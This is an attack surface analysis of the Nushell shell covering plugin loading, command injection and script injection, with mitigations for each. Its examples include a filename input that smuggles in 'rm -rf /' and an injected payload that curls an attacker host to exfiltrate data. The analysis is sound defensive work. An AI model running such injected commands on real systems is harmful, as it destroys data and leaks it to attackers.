# Attack Surface Analysis for nushell/nushell

## Attack Surface: [1. Plugin System - Unverified Plugin Loading](./attack_surfaces/1__plugin_system_-_unverified_plugin_loading.md)

*   **Description:** Loading external, unverified Nushell plugins allows execution of arbitrary code within the Nushell process. This bypasses any security measures within the application using Nushell, as plugins operate with Nushell's privileges.
*   **Nushell Contribution:** Nushell's design includes a plugin system for extending functionality. The risk arises if the application using Nushell permits loading plugins from untrusted sources or without proper validation.
*   **Example:** An application allows users to extend Nushell functionality by specifying a plugin path. A malicious actor provides a path to a crafted Nushell plugin. When the application loads this plugin, it executes malicious Rust code embedded within, potentially establishing a reverse shell back to the attacker.
*   **Impact:** Remote Code Execution (RCE), Data Exfiltration, Denial of Service (DoS), Privilege Escalation.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **Disable Plugin Loading:** If plugins are not essential, disable plugin loading entirely within the application's Nushell configuration or usage.
    *   **Plugin Whitelisting:**  Implement a strict whitelist of allowed plugin paths or plugin names. Only load plugins from trusted, pre-approved locations.
    *   **Plugin Verification (Digital Signatures):** If possible, implement a mechanism to verify the digital signatures of plugins before loading, ensuring they originate from trusted developers and haven't been tampered with.
    *   **Sandboxing (Operating System Level):**  Run the Nushell process within a sandboxed environment (e.g., using containers, VMs, or OS-level sandboxing features) to limit the impact of a compromised plugin.
    *   **Code Review and Security Audits:** For internally developed plugins, conduct rigorous code reviews and security audits to identify and remediate potential vulnerabilities before deployment.

## Attack Surface: [2. External Command Execution - Command Injection](./attack_surfaces/2__external_command_execution_-_command_injection.md)

*   **Description:** Nushell's features for executing external system commands (`^` operator, `run-external`) become a critical attack surface if user-controlled input is incorporated into these commands without robust sanitization. This can lead to command injection, allowing attackers to execute arbitrary commands on the underlying operating system.
*   **Nushell Contribution:** Nushell provides direct mechanisms to interact with the operating system by executing external commands.  Improper handling of user input when constructing these commands directly exposes the application to command injection risks via Nushell.
*   **Example:** A Nushell script uses user input to construct a command for processing files: `let filename = $user_input; ^ convert $filename output.pdf`. If a malicious user inputs  `"input.txt; rm -rf / #"` as the filename, the executed command becomes `convert input.txt; rm -rf / # output.pdf`, potentially leading to system-wide data deletion.
*   **Impact:** Remote Code Execution (RCE), Data Manipulation, Denial of Service (DoS), Privilege Escalation.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **Avoid User Input in External Commands:**  The most secure approach is to avoid directly incorporating user input into external commands whenever possible. Re-evaluate the need to execute external commands with user-provided data.
    *   **Strict Input Sanitization and Validation:** If external commands with user input are unavoidable, implement extremely rigorous input sanitization and validation. Use allow-lists for characters, validate input length and format, and escape potentially harmful characters specific to the shell environment.
    *   **Command Whitelisting (Restrict Command Set):** Limit the set of external commands that can be executed to a predefined, minimal, and safe list.  Prevent execution of arbitrary commands.
    *   **Parameterization (Where Applicable):**  If the target external command supports parameterized input (though less common in shell commands), utilize parameterization to separate data from commands.
    *   **Least Privilege for Nushell Process:** Run the Nushell process with the absolute minimum privileges required. This limits the potential damage if command injection is exploited.

## Attack Surface: [3. Nushell Scripting Language - Script Injection](./attack_surfaces/3__nushell_scripting_language_-_script_injection.md)

*   **Description:**  Directly embedding user-provided input into Nushell scripts that are subsequently executed creates a script injection vulnerability. Attackers can inject malicious Nushell code, altering the script's intended behavior and potentially gaining control over the application or system.
*   **Nushell Contribution:** Nushell's scripting language allows for dynamic script construction.  If the application dynamically builds or modifies Nushell scripts based on user input without careful handling, it becomes susceptible to script injection attacks.
*   **Example:** An application dynamically generates a Nushell script to filter data based on user criteria: `$filter = $user_input; nu -c "ls | where {$filter}"`. A malicious user could input `{ name =~ ".*" }; ^ curl attacker.com/exfiltrate-data`. This injected code would execute an external command to exfiltrate data after the intended filtering.
*   **Impact:** Remote Code Execution (RCE), Data Manipulation, Data Exfiltration, Denial of Service (DoS).
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Avoid Dynamic Script Construction with User Input:**  The most secure approach is to avoid dynamically constructing Nushell scripts using user input.  Re-design the application logic to avoid this pattern.
    *   **Input Validation and Contextual Sanitization:** If dynamic script construction is absolutely necessary, implement extremely strict input validation and contextual sanitization.  Understand Nushell's syntax and escape or reject any input that could be interpreted as code injection. This is complex and error-prone.
    *   **Use Nushell's Built-in Features for Data Manipulation:**  Favor using Nushell's built-in commands and data structures (filters, pipelines, data transformations) to process user data instead of resorting to dynamic script generation.
    *   **Code Review and Security Testing:**  Thoroughly review any code that dynamically generates Nushell scripts for potential injection vulnerabilities. Conduct penetration testing to identify weaknesses.
